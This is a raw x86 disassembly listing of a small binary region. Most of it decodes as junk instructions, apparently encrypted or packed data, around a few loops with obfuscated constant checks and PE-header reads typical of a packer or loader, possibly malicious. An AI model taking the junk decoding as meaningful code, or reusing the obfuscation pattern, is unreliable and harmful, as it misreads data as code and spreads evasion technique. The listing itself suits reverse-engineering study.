  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	loopne 0x417716
  4176bc:	je     0x417735
  4176be:	jg     0x4176ed
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0x5778787e
  4176c7:	xchg   ebp,eax
  4176c8:	mov    BYTE PTR [ecx-0x5f],dh
  4176cb:	mov    bh,0x27
  4176cd:	cs mov ebp,0x8f4b684f
  4176d3:	xor    eax,0x61727b86
  4176d8:	cmc    
  4176d9:	sahf   
  4176da:	jp     0x41772b
  4176dc:	(bad)  
  4176de:	pusha  
  4176df:	ins    BYTE PTR es:[edi],dx
  4176e0:	pusha  
  4176e1:	es iret 
  4176e3:	leave  
  4176e4:	mov    dl,0x47
  4176e6:	sbb    ebp,edx
  4176e8:	mov    al,0x7f
  4176ea:	add    DWORD PTR [edx+edi*4],ebx
  4176ed:	call   0x17ae:0x7e2b2fcb
  4176f4:	scas   eax,DWORD PTR es:[edi]
  4176f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f6:	sub    bh,dh
  4176f8:	stos   DWORD PTR es:[edi],eax
  4176f9:	mov    edx,0xdd7dc966
  4176fe:	adc    DWORD PTR [ecx],edi
  417700:	push   edi
  417701:	mov    edi,0x9ea5c675
  417706:	nop
  417707:	sbb    eax,0x5ed72362
  41770c:	int    0x4a
  41770e:	mov    ebx,0xda6499b0
  417713:	jnp    0x417778
  417715:	out    dx,al
  417716:	mov    cl,bh
  417718:	leave  
  417719:	jecxz  0x41774e
  41771b:	or     eax,0x2827947d
  417720:	mov    eax,0x56c50c4c
  417725:	js     0x4176c4
  417727:	loopne 0x4177a1
  417729:	imul   esi,esp,0xcbc5ac6f
  41772f:	jge    0x4176c9
  417731:	cmp    al,0xbd
  417733:	jne    0x417793
  417735:	outs   dx,BYTE PTR ds:[esi]
  417736:	cmp    BYTE PTR [esi],ch
  417738:	test   eax,0x72cf570d
  41773d:	sahf   
  41773e:	dec    ebx
  41773f:	push   eax
  417740:	stos   DWORD PTR es:[edi],eax
  417741:	sub    eax,0x700c4162
  417746:	js     0x4176ec
  417748:	imul   ebp,eax,0xffffffc9
  41774b:	ret    0xb507
  41774e:	mov    ebx,DWORD PTR [ebx-0x9db3a18]
  417754:	jl     0x41777c
  417756:	ds in  eax,dx
  417758:	jg     0x4176e4
  41775a:	div    bh
  41775c:	pushf  
  41775d:	ret    0x47a4
  417760:	mov    edx,0x719254b2
  417765:	push   0xbad8577d
  41776a:	mov    gs,WORD PTR [edx+0xd]
  41776d:	retf   
  41776e:	or     ch,ch
  417770:	sbb    ebp,edx
  417772:	mov    dl,0x72
  417774:	mov    eax,0x20ce1e7c
  417779:	jmp    0x89f1250c
  41777e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41777f:	ss adc eax,0x62ce9357
  417785:	push   ebx
  417786:	inc    eax
  417787:	xchg   edx,eax
  417788:	mov    bl,BYTE PTR ds:0xcd89981c
  41778e:	fisttp QWORD PTR [ebp+0x1b]
  417791:	sub    edi,DWORD PTR [eax-0x3eefeb83]
  417797:	int    0x10
  417799:	fst    DWORD PTR [esi+0x2649383d]
  41779f:	sbb    BYTE PTR [esi+0x6],al
  4177a2:	(bad)  
  4177a3:	adc    dh,al
  4177a5:	push   eax
  4177a6:	idiv   BYTE PTR [edx+esi*8-0x10b5dcfc]
  4177ad:	xchg   ebp,eax
  4177ae:	jge    0x41773a
  4177b0:	stos   BYTE PTR es:[edi],al
  4177b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177b2:	push   edi
  4177b3:	xor    ch,bh
  4177b5:	jb     0x4177d5
  4177b7:	and    cl,BYTE PTR [ebx-0x21b19fa5]
  4177bd:	sysexit 
  4177bf:	retf   0x5e75
  4177c2:	jns    0x417777
  4177c4:	stos   DWORD PTR es:[edi],eax
  4177c5:	and    eax,0xfd49855
  4177ca:	ja     0x417795
  4177cc:	ret    0xacd3
  4177cf:	jecxz  0x417821
  4177d1:	push   edx
  4177d2:	aad    0xb4
  4177d4:	sbb    al,0x5d
  4177d6:	xlat   BYTE PTR ds:[ebx]
  4177d7:	push   es
  4177d8:	mov    cl,0xe6
  4177da:	mov    bl,0x76
  4177dc:	add    DWORD PTR [ecx-0x6a],ebp
  4177df:	push   cs
  4177e0:	sar    BYTE PTR ds:0x8b7c632b,cl
  4177e6:	out    dx,al
  4177e7:	mov    dh,0xa2
  4177e9:	(bad)  
  4177ea:	call   0xb03b3e47
  4177ef:	not    ah
  4177f1:	and    edi,DWORD PTR [ebx+0x37dc3628]
  4177f7:	repnz pop ecx
  4177f9:	sub    DWORD PTR [eax+0x3f],0xffffffa0
  4177fd:	call   0xc983:0x9b6d9dc
  417804:	sub    ebx,0x1a
  417807:	(bad)  
  417808:	mov    WORD PTR [eax-0x332e1b15],cs
  41780e:	or     DWORD PTR [ebx-0x4ede3175],0x7d
  417815:	(bad)  
  417817:	or     al,BYTE PTR [edi-0x61]
  41781a:	jbe    0x417844
  41781c:	jle    0x4177ae
  41781e:	repz lds esp,FWORD PTR [esi+0x64004a61]
  417825:	out    0xee,eax
  417827:	push   edi
  417828:	pop    edx
  417829:	into   
  41782a:	loop   0x4177da
  41782c:	xchg   DWORD PTR [edx-0x37f45a8d],eax
  417832:	mov    ah,0x31
  417834:	popf   
  417835:	int3   
  417836:	push   eax
  417837:	shl    DWORD PTR [esp+edi*2],0xf4
  41783b:	fdivr  st,st(3)
  41783d:	mov    esi,DWORD PTR [edi+esi*1+0x2f]
  417841:	repz sub DWORD PTR [edi-0x21],ebp
  417845:	(bad)  
  417846:	sti    
  417847:	mov    ?,WORD PTR [edi+esi*4]
  41784a:	test   ah,dl
  41784c:	mov    DWORD PTR [ecx+0x31],0x980ccfaf
  417853:	mov    al,ds:0x76cc3049
  417858:	push   esi
  417859:	jno    0x417895
  41785b:	jno    0x417872
  41785d:	cmp    eax,esp
  41785f:	pushf  
  417860:	test   eax,0x8772c304
  417865:	rcl    BYTE PTR ds:0xab284ff7,cl
  41786b:	xor    al,0xf0
  41786d:	ds sub al,0xc4
  417870:	and    BYTE PTR [edi-0x58121b77],ch
  417876:	dec    esi
  417877:	loop   0x417808
  417879:	xchg   ecx,eax
  41787a:	mov    ebp,0xf8b1ed39
  41787f:	(bad)  
  417880:	jg     0x417807
  417882:	data16 jne 0x417890
  417885:	mov    ah,0xc0
  417887:	jecxz  0x4178fd
  417889:	or     DWORD PTR [edi],ecx
  41788b:	sbb    al,BYTE PTR [eax]
  41788d:	dec    esp
  41788e:	mov    esp,0x234c27a5
  417893:	adc    ecx,DWORD PTR [edi+0x21a6ce76]
  417899:	(bad)  
  41789a:	jmp    0x3f0c:0xb7043e1f
  4178a1:	adc    BYTE PTR [edi],0xb7
  4178a4:	mov    bl,0xc8
  4178a6:	mov    al,0x17
  4178a8:	int    0x6f
  4178aa:	idiv   DWORD PTR gs:[ecx-0x2f8ebc17]
  4178b1:	lods   eax,DWORD PTR ds:[esi]
  4178b2:	xor    ch,dl
  4178b4:	neg    BYTE PTR [edx+0x51227bb0]
  4178ba:	push   ds
  4178bb:	call   0xe60d:0xba6a110c
  4178c2:	push   0x61
  4178c4:	mov    BYTE PTR [ebx],dl
  4178c6:	jg     0x417938
  4178c8:	pushf  
  4178c9:	mov    bl,0x5f
  4178cb:	pop    ds
  4178cc:	test   edi,ecx
  4178ce:	lock retf 
  4178d0:	lahf   
  4178d1:	add    ecx,DWORD PTR [eax+0x3c]
  4178d4:	jmp    0x417afc
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	jmp    0x4bd94e2
  4178ea:	xor    edi,DWORD PTR [edi+0x78]
  4178ed:	add    eax,0xf778787e
  4178f2:	sbb    ch,BYTE PTR [eax-0x18f02d08]
  4178f8:	pushf  
  4178f9:	mov    DWORD PTR [esi],eax
  4178fb:	add    ch,BYTE PTR [eax+edx*2+0x5581d928]
  417902:	in     al,0x97
  417904:	pushf  
  417905:	pop    ebp
  417906:	(bad)  
  417907:	sar    BYTE PTR [esi-0x33],1
  41790a:	repz xchg esp,eax
  41790c:	inc    DWORD PTR [ecx+0x17]
  41790f:	xor    ah,bh
  417911:	pusha  
  417912:	stos   BYTE PTR es:[edi],al
  417913:	out    0x56,al
  417915:	dec    edx
  417916:	call   0x8763:0x7cf79907
  41791d:	loopne 0x417986
  41791f:	jecxz  0x4178c3
  417921:	mov    ds:0xfcc5c331,eax
  417926:	fdivp  st(7),st
  417928:	add    dh,BYTE PTR [eax]
  41792a:	shr    DWORD PTR [eax],0x95
  41792d:	mov    bh,dl
  41792f:	sbb    eax,0xc6e26185
  417934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417935:	push   ebp
  417936:	sar    ecx,0x70
  417939:	xchg   edx,eax
  41793a:	cmp    ebx,DWORD PTR [eax+0x7a]
  41793d:	pusha  
  41793e:	scas   eax,DWORD PTR es:[edi]
  41793f:	add    al,0x78
  417941:	fsub   DWORD PTR [ebp+0x71]
  417944:	adc    al,0x9b
  417946:	adc    ebx,DWORD PTR ds:0xd475adfb
  41794c:	outs   dx,BYTE PTR ds:[esi]
  41794d:	fistp  WORD PTR [eax+eiz*1+0x23]
  417951:	fisttp QWORD PTR [esi-0x42]
  417954:	call   0xc2fe5205
  417959:	sbb    al,0xc9
  41795b:	outs   dx,BYTE PTR ds:[esi]
  41795c:	mov    cs,ebx
  41795e:	aaa    
  41795f:	jne    0x417964
  417961:	out    dx,al
  417962:	cli    
  417963:	jmp    0xf7d7:0x2d03e4ba
  41796a:	shl    esi,0x43
  41796d:	out    dx,eax
  41796e:	push   cs
  41796f:	jle    0x41790c
  417971:	mov    bl,0xb8
  417973:	sbb    al,0x83
  417975:	inc    ecx
  417976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417977:	loop   0x4179c0
  417979:	ss and cl,ah
  41797c:	adc    al,0xe6
  41797e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41797f:	ror    DWORD PTR [ecx],cl
  417981:	loopne 0x4179ce
  417983:	pop    esp
  417984:	scas   eax,DWORD PTR es:[edi]
  417985:	push   0x30a7182d
  41798a:	xchg   esp,eax
  41798b:	inc    BYTE PTR [esi-0x46]
  41798e:	mov    dl,0xc0
  417990:	pop    esi
  417991:	(bad)  
  417992:	iret   
  417993:	or     al,0xac
  417995:	push   cs
  417996:	int    0xfd
  417998:	popf   
  417999:	frstor [ebx]
  41799b:	jno    0x4179de
  41799d:	sbb    bh,BYTE PTR [ecx]
  41799f:	xchg   esp,eax
  4179a0:	ffreep st(3)
  4179a2:	or     eax,0xd76d45b5
  4179a7:	and    ecx,DWORD PTR [edi+0x3a]
  4179aa:	aam    0xd4
  4179ac:	pusha  
  4179ad:	sub    ebx,0xa
  4179b0:	pop    ebx
  4179b1:	push   ebx
  4179b2:	xchg   edi,eax
  4179b3:	ds aam 0xa6
  4179b6:	les    ebp,FWORD PTR [ebx-0x4d90cbeb]
  4179bc:	inc    eax
  4179bd:	in     eax,0x51
  4179bf:	add    DWORD PTR [ebx-0x17],esp
  4179c2:	daa    
  4179c3:	and    al,0xd2
  4179c5:	mov    ds:0x9dd2a8a3,eax
  4179ca:	es cmp edx,edi
  4179cd:	mov    al,BYTE PTR [ebx]
  4179cf:	outs   dx,DWORD PTR ds:[esi]
  4179d0:	mov    al,ds:0x31a71bad
  4179d5:	push   edi
  4179d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179d7:	or     eax,0x31cae1ef
  4179dd:	dec    ecx
  4179de:	jge    0x4179e9
  4179e0:	rol    DWORD PTR [ebp-0x12],0xe7
  4179e4:	mov    ?,WORD PTR [edx+0x19]
  4179e7:	test   DWORD PTR [ebx+0x7cc10764],esp
  4179ed:	cmp    BYTE PTR [edi],ch
  4179ef:	xchg   edx,eax
  4179f0:	ds jle 0x417a50
  4179f3:	dec    esp
  4179f4:	jmp    0x4179ef
  4179f6:	stc    
  4179f7:	pop    es
  4179f8:	ins    DWORD PTR es:[edi],dx
  4179f9:	sbb    DWORD PTR [ecx+ebp*8],ebp
  4179fc:	jg     0x4179c4
  4179fe:	mov    edx,0x9421a9c9
  417a03:	into   
  417a04:	out    0xc6,al
  417a06:	inc    ecx
  417a07:	mov    esp,0xb1e671e8
  417a0c:	outs   dx,DWORD PTR ds:[esi]
  417a0d:	outs   dx,DWORD PTR ds:[esi]
  417a0e:	xchg   esp,eax
  417a0f:	mov    ecx,0xdadc848b
  417a14:	xchg   edx,eax
  417a15:	mov    eax,0x31cd3aa8
  417a1a:	push   0x43
  417a1c:	bound  esi,QWORD PTR [edi]
  417a1e:	into   
  417a1f:	mov    ch,0x16
  417a21:	pop    edx
  417a22:	jmp    0x4179bc
  417a24:	and    al,0xca
  417a26:	jne    0x417a6f
  417a28:	jecxz  0x417a65
  417a2a:	mov    eax,0x6648cae
  417a2f:	dec    eax
  417a30:	popf   
  417a31:	outs   dx,DWORD PTR ds:[esi]
  417a32:	xlat   BYTE PTR ds:[ebx]
  417a33:	mov    al,0x77
  417a35:	mov    al,0x5f
  417a37:	stc    
  417a38:	sbb    BYTE PTR ds:0x32e77665,0xd9
  417a3f:	jo     0x4179cf
  417a41:	jnp    0x417a1d
  417a43:	mov    edi,ds
  417a45:	lock scas eax,DWORD PTR es:[edi]
  417a47:	lods   eax,DWORD PTR ds:[esi]
  417a48:	mov    bl,0x7e
  417a4a:	fisubr WORD PTR [edi]
  417a4c:	jb     0x417ac5
  417a4e:	add    ebx,esp
  417a50:	repnz ss stos BYTE PTR es:[edi],al
  417a53:	xchg   ecx,eax
  417a54:	push   0xffffffa7
  417a56:	cmp    DWORD PTR [ebx],esi
  417a58:	jnp    0x417a00
  417a5a:	jns    0x417a60
  417a5c:	fistp  QWORD PTR [edx+eiz*1+0x82e9c11]
  417a63:	xchg   ecx,eax
  417a64:	xchg   ecx,eax
  417a65:	or     BYTE PTR [ebp+0x26],ah
  417a68:	mov    al,0xe7
  417a6a:	jmp    0xc42cf9e2
  417a6f:	mov    bh,0xc9
  417a71:	xchg   edi,eax
  417a72:	sbb    ch,bh
  417a74:	sti    
  417a75:	mov    edi,cs
  417a77:	and    BYTE PTR [esi-0x3267b861],dl
  417a7d:	imul   bh
  417a7f:	push   esi
  417a80:	fs cld 
  417a82:	mov    al,dl
  417a84:	ret    
  417a85:	or     cl,BYTE PTR [ebx+0x78]
  417a88:	imul   esi,esp,0xc3c98f6d
  417a8e:	sti    
  417a8f:	pop    ss
  417a90:	xchg   esp,eax
  417a91:	in     al,0xc1
  417a93:	jmp    0x417a68
  417a95:	inc    esi
  417a96:	inc    edx
  417a97:	and    BYTE PTR [esi-0x33c5e078],dl
  417a9d:	test   eax,0x65e70273
  417aa2:	iret   
  417aa3:	xor    eax,0x610a4f8
  417aa8:	or     al,0xd
  417aaa:	and    dl,BYTE PTR [edx+0x3c4b2f4b]
  417ab0:	xor    cl,BYTE PTR [esi+0xe5aeb09]
  417ab6:	pop    es
  417ab7:	cmp    DWORD PTR [eax+0x20],ebp
  417aba:	ror    DWORD PTR [eax-0x7593b7c9],cl
  417ac0:	sub    BYTE PTR [ecx],ch
  417ac2:	fstp   QWORD PTR [edi-0x2d0b4c1a]
  417ac8:	sbb    BYTE PTR [ebp+0x38],al
  417acb:	jae    0x417ab7
  417acd:	in     eax,0x2
  417acf:	cmp    BYTE PTR ds:0x27414f76,0xd8
  417ad6:	aaa    
  417ad7:	cdq    
  417ad8:	lock out 0xdc,eax
  417adb:	in     al,0x7b
  417add:	jle    0x417a7a
  417adf:	repnz rcr DWORD PTR [edi],1
  417ae2:	inc    edi
  417ae3:	xor    DWORD PTR [ecx+edi*2+0x74],esi
  417ae7:	dec    DWORD PTR [edi]
  417ae9:	dec    esi
  417aea:	in     al,dx
  417aeb:	mov    eax,ds:0x732f3bb9
  417af0:	retf   
  417af1:	test   BYTE PTR [edx],cl
  417af3:	(bad)  
  417af4:	scas   eax,DWORD PTR es:[edi]
  417af5:	adc    DWORD PTR [ebp+edx*1+0x36],esp
  417af9:	mov    ds:0x50baa8de,eax
  417afe:	or     BYTE PTR [ecx+0x7],dl
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0x2e54396c
  417b49:	pop    ecx
  417b4a:	adc    DWORD PTR [ecx],esi
  417b4c:	jg     0x417bc6
  417b4e:	add    eax,0x6578787e
  417b53:	fucomi st,st(4)
  417b55:	sbb    al,0xa9
  417b57:	mov    ebx,0x4e927a76
  417b5c:	jae    0x417b2b
  417b5e:	sbb    DWORD PTR [ebx+0x8],eax
  417b61:	test   BYTE PTR [edx+0x31],bh
  417b64:	mov    dl,dl
  417b66:	add    dl,BYTE PTR [edi+ebp*1+0x53eeed65]
  417b6d:	fst    QWORD PTR [edx]
  417b6f:	repnz (bad) 
  417b71:	lds    edx,FWORD PTR [ebp+0x45]
  417b74:	in     al,dx
  417b75:	aad    0x74
  417b77:	pop    ss
  417b78:	push   esp
  417b79:	fld    st(6)
  417b7b:	dec    esp
  417b7c:	ds cmp esp,ebx
  417b7f:	lahf   
  417b80:	xor    DWORD PTR [edi+esi*8-0x1ff3e6af],ebp
  417b87:	rcl    DWORD PTR [edi-0x3e],1
  417b8a:	or     BYTE PTR [ebx],0xb3
  417b8d:	xlat   BYTE PTR ds:[ebx]
  417b8e:	mov    al,0xda
  417b90:	push   ecx
  417b91:	cdq    
  417b92:	xor    eax,0xb6c0fd35
  417b97:	push   0xa1404b42
  417b9c:	mov    ah,BYTE PTR [edx+0x79693c0e]
  417ba2:	add    edx,DWORD PTR [ecx]
  417ba4:	fstp   QWORD PTR [ebp+eax*2-0x7fdf50a0]
  417bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bad:	jae    0x417b30
  417baf:	pop    edi
  417bb0:	test   ebx,edx
  417bb2:	ja     0x417be2
  417bb4:	shr    DWORD PTR [esi-0x475b2943],0x6a
  417bbb:	outs   dx,DWORD PTR ds:[esi]
  417bbc:	mov    al,ds:0xe992d317
  417bc1:	jmp    0x417bc0
  417bc3:	(bad)  
  417bc4:	mov    al,0xa6
  417bc6:	pop    ebp
  417bc7:	cmp    DWORD PTR ds:0x931b6f98,edx
  417bcd:	or     DWORD PTR [esi-0x47],ebx
  417bd0:	jb     0x417c25
  417bd2:	xchg   DWORD PTR [ebx],esi
  417bd4:	sar    DWORD PTR [esi-0x74],1
  417bd7:	inc    ebp
  417bd8:	inc    ecx
  417bd9:	das    
  417bda:	pop    ds
  417bdb:	jl     0x417c58
  417bdd:	push   ecx
  417bde:	or     bl,bh
  417be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417be1:	in     al,dx
  417be2:	icebp  
  417be3:	mov    dh,0x8
  417be5:	mov    BYTE PTR [esi],al
  417be7:	daa    
  417be8:	xchg   esi,esp
  417bea:	popf   
  417beb:	repz cmc 
  417bed:	cmp    al,BYTE PTR [edi+eiz*2+0x498a96e6]
  417bf4:	(bad)  
  417bf6:	sbb    BYTE PTR [eax-0x61d9dbb0],bl
  417bfc:	mov    ds:0xe0b9c8bc,al
  417c01:	mov    bh,0xc1
  417c03:	test   eax,0x543ece28
  417c08:	jmp    0x417c34
  417c0a:	(bad)  
  417c0b:	jb     0x417c49
  417c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c0e:	(bad)  
  417c10:	jg     0x417c3e
  417c12:	neg    BYTE PTR [edi-0x27133e6]
  417c18:	mov    ah,ch
  417c1a:	push   eax
  417c1b:	push   esp
  417c1c:	mov    ebp,0xbca3db98
  417c21:	push   esi
  417c22:	icebp  
  417c23:	fidiv  WORD PTR [edi+0x19]
  417c26:	sub    dl,BYTE PTR [edx]
  417c28:	fsubr  DWORD PTR [esi-0x42]
  417c2b:	xor    ah,BYTE PTR [eax+0x228d9a7c]
  417c31:	js     0x417c39
  417c33:	xchg   ebx,eax
  417c34:	jno    0x417c1b
  417c36:	mov    al,ds:0xaac58e2d
  417c3b:	and    cl,BYTE PTR [ebx+0x746f71e4]
  417c41:	je     0x417c02
  417c43:	mov    dl,0x25
  417c45:	pop    edx
  417c46:	add    al,0xc
  417c48:	(bad)  
  417c49:	xchg   edx,eax
  417c4a:	cmp    eax,0x361b8bad
  417c4f:	or     al,0x16
  417c51:	add    DWORD PTR [edx],ecx
  417c53:	mov    eax,DWORD PTR [ecx-0x42874f56]
  417c59:	xchg   ebx,ecx
  417c5b:	imul   edx,DWORD PTR [ecx-0x1450d131],0xffffffa2
  417c62:	xor    BYTE PTR [edx+0x6ffda5b1],dh
  417c68:	push   edi
  417c69:	inc    ebp
  417c6a:	mov    bl,0x88
  417c6c:	dec    ebp
  417c6d:	sbb    ah,ah
  417c6f:	lods   eax,DWORD PTR ds:[esi]
  417c70:	cmp    bl,dh
  417c72:	xchg   DWORD PTR ds:0xd3b594df,edi
  417c78:	xchg   DWORD PTR ds:0x39c0c5ab,esi
  417c7e:	mov    al,0xb5
  417c80:	sidtd  [esi-0x69]
  417c84:	mov    DWORD PTR [ebx],edi
  417c86:	sub    BYTE PTR [ebp+ebx*2-0x4b],ah
  417c8a:	test   DWORD PTR [edx+0x47],ebp
  417c8d:	cli    
  417c8e:	jle    0x417d01
  417c90:	icebp  
  417c91:	fmul   QWORD PTR [eax]
  417c93:	sti    
  417c94:	sbb    eax,0x2a0aeb36
  417c99:	scas   al,BYTE PTR es:[edi]
  417c9a:	dec    edx
  417c9b:	push   edx
  417c9c:	mov    cl,0x52
  417c9e:	sub    ecx,DWORD PTR [ebp+0x10]
  417ca1:	push   edx
  417ca2:	cmp    eax,0x67161c86
  417ca7:	mov    bl,0xc0
  417ca9:	push   ecx
  417caa:	les    esi,FWORD PTR [esi]
  417cac:	add    eax,DWORD PTR [eax-0x3e]
  417caf:	inc    esp
  417cb0:	sbb    dl,BYTE PTR [ebp+0x3be80896]
  417cb6:	mov    dh,0x41
  417cb8:	cld    
  417cb9:	adc    BYTE PTR [edx],al
  417cbb:	cmp    ebx,DWORD PTR [esi+0x3c]
  417cbe:	icebp  
  417cbf:	aad    0x82
  417cc1:	mov    eax,0x4e2571c6
  417cc6:	or     esi,ebx
  417cc8:	cmp    BYTE PTR [edx+0xb13cc4c],bh
  417cce:	scas   eax,DWORD PTR es:[edi]
  417ccf:	xchg   edi,eax
  417cd0:	push   ebx
  417cd1:	fs dec esi
  417cd3:	push   eax
  417cd4:	xlat   BYTE PTR ss:[ebx]
  417cd6:	fcmovu st,st(0)
  417cd8:	bound  esp,QWORD PTR [edi]
  417cda:	sbb    eax,0x51
  417cdd:	and    ecx,DWORD PTR [ecx+0x55]
  417ce0:	sbb    DWORD PTR [ebp+eiz*8-0x23],ebp
  417ce4:	lds    eax,FWORD PTR [edx+0x26f17486]
  417cea:	call   0xee84777b
  417cef:	adc    eax,0x6a8d9695
  417cf4:	add    ch,BYTE PTR [esi+0x1]
  417cf7:	sahf   
  417cf8:	imul   eax,DWORD PTR [edx+0x70],0x4a
  417cfc:	adc    al,0x75
  417cfe:	(bad)  [ebx-0x729cf7f6]
  417d04:	enter  0x8d18,0x69
  417d08:	(bad)  
  417d09:	mov    edx,0x5cc50a6d
  417d0e:	inc    ecx
  417d0f:	das    
  417d10:	mov    eax,0xee106fb9
  417d15:	and    BYTE PTR [esp+eiz*2],cl
  417d18:	leave  
  417d19:	retf   0x557e
  417d1c:	pop    ss
  417d1d:	jmp    FWORD PTR [eax-0x71]
  417d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d21:	stc    
  417d22:	push   0xba1f4af1
  417d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d28:	(bad)  
  417d29:	add    al,0xdc
  417d2b:	fst    QWORD PTR [ebx+0x437b7399]
  417d31:	adc    cl,dh
  417d33:	sub    al,0x29
  417d35:	mov    cl,0x27
  417d37:	mov    ch,0x51
  417d39:	sbb    eax,0x963c0301
  417d3e:	mov    eax,0xa648d809
  417d43:	leave  
  417d44:	idiv   al
  417d46:	dec    edi
  417d47:	add    esi,DWORD PTR es:[edi]
  417d4a:	(bad)  [esi+0x2aca514d]
  417d50:	shl    BYTE PTR [edx-0x7b],1
  417d53:	xor    eax,DWORD PTR [ecx]
  417d55:	gs ds mov cl,0x44
  417d59:	xchg   ecx,eax
  417d5a:	pop    edx
  417d5b:	aaa    
  417d5c:	shl    DWORD PTR ds:0x7510850,1
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	inc    DWORD PTR [esi+ebx*8+0x20]
  417e90:	cmp    eax,0x787f371e
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	add    ah,bh
  417e9b:	adc    BYTE PTR [ebx-0x64f6008f],0xdb
  417ea2:	hlt    
  417ea3:	lds    edx,FWORD PTR [edx+edx*8]
  417ea6:	push   eax
  417ea7:	inc    edx
  417ea8:	out    0x46,al
  417eaa:	jmp    0x591d:0x96af832f
  417eb1:	fnstenv [ebx-0xa]
  417eb4:	ss add al,0x6c
  417eb7:	xor    dh,BYTE PTR [eax+0xbaae89]
  417ebd:	mov    ebx,eax
  417ebf:	mov    WORD PTR [eax-0x735b181b],ss
  417ec5:	jo     0x417ee4
  417ec7:	in     al,dx
